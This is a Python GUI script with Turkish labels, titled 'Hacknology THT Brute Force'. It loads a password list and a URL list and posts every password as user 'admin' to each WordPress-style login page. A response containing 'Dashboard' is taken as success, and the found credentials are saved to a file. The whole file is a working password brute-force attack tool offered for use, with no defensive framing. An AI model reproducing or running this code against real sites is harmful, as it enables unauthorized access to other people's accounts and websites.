#!/usr/bin/env python
# -*- coding: utf-8 -*-

from tkinter import Tk, Button, Label
from tkinter import StringVar, IntVar
from tkinter import *

import random
import requests
import sys


def update(new):
    var.set(new)
    
    pencere.update_idletasks() 
def kodlar():
    
    
    sifreler = open(s.get(), "r").readlines()
    urller = open(p.get(), "r").readlines()
    for site in urller:
        site = site.strip()
        for sifre in sifreler:            
            session = requests.Session()
            print(site, "-->", sifre)            
            try:        
                r = session.post(site, data={"log":"admin","pwd":sifre},timeout=15)            
            except (requests.exceptions.ConnectionError):
            
                continue
            
            if "Dashboard" in r.text:
                x = "[+]" + site + " " + "urlsi icin" + " " + sifre + " " + "sifresi dogru!" + "\n"
                
                print(x)
                update(x)
                dosya = open("basarili.txt", "w").write(x)
    etiket = Label(text=x)
def yazdir():
    sifreler = open(s.get(), "r").readlines()
    urller = open(p.get(), "r").readlines()
    for i in sifreler:
        liste.insert(END, i)
    for t in urller:
        liste1.insert(END, t)
pencere = Tk()
pencere.geometry("800x600+100+100")
img = PhotoImage(file="arkaplan.gif")
arka = Label(image=img)
arka.pack()
var = StringVar()
var.set("Sifre Dosyasını girin: ")
var1 = StringVar()
var1.set("Url Dosyasını girin: ")
baslik = pencere.title("Hacknology THT Brute Force")
pencere.geometry("300x50+600+460")
pencere.wm_iconbitmap("simge.ico")
pencere.tk_setPalette("black")
etiket = Label(textvariable=var,
               fg="blue",
               bg="#000000",
               font="Helvetica 12 bold")
etiket.pack(side=TOP)
s = Entry()
btn = Button(text="Şifre dosyası", command=yazdir, bg="green")
s.pack()
btn.pack(side=TOP)
etiket = Label(textvariable=var1,
               fg="blue",
               bg="#000000",
               font="Helvetica 12 bold")
etiket.pack(side=TOP)
p = Entry()
btn4 = Button(text="Url dosyası", command=yazdir, bg="green")
p.pack()
btn4.pack(side=TOP)
dugme = Button(text="Basla!",command=kodlar, fg="green", bg="black")
dugme.pack(side=BOTTOM)
liste1 = Listbox(pencere, bg="white", fg="black")
liste1.pack(side=LEFT)
liste = Listbox(pencere, bg="white", fg="black")
liste.pack(side=LEFT)

mainloop()
